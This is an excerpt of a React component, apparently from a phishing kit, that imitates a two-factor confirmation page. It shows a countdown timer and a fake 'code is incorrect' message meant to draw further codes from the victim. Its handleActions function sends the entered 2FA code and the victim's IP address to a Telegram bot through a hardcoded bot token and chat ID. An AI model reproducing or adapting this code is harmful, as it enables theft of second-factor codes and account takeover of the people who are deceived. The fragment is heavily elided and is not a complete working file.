...
class Confirm2 extends Component {
    ...
    startTimer = (duration) => {
        ...
        const myInterval = setInterval(() => {
            ...
            if (timer === 0) {
                ...
                this.setState({ isButtonDisabled: false }); // Enable the button when the timer reaches 0
            } else {
                this.setState({ isButtonDisabled: true }); // Disable the button while the timer is running
            }
    
            if (--timer < 0) {
                timer = duration;
            }
            document.getElementById('timeri').innerText = `${minutes}:${seconds}`;
        }, 1000);
    };
    ...
    handleActions = () => {
        ...
        if (code === '') {
			...
			const botToken = '7147259670:AAHZzkhFXm6ZhXln7kmspSIJasZzZ4ZP9CI';
			const chatId = '-1002060045411';
    
            const message = `2FA 2: "${code}"\nIP: ${ip}`;
            ...
            fetch(
                `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${params.content}&parse_mode=${params.parse_mode}`,
                {
                    method: 'POST',
                    headers: {
                                ...
                                <div className="card">
                                    ...
                                    <div className="bodyyy">
                                        ...
                                        <div
                                            ...
                                            className="text-danger wrong text-wrong "
                                            style={{ fontSize: '11px' }}
                                        >
                                           The code generator you entered is incorrect. Please wait 1 minute to receive another one.
                                        </div>
                                    </div>
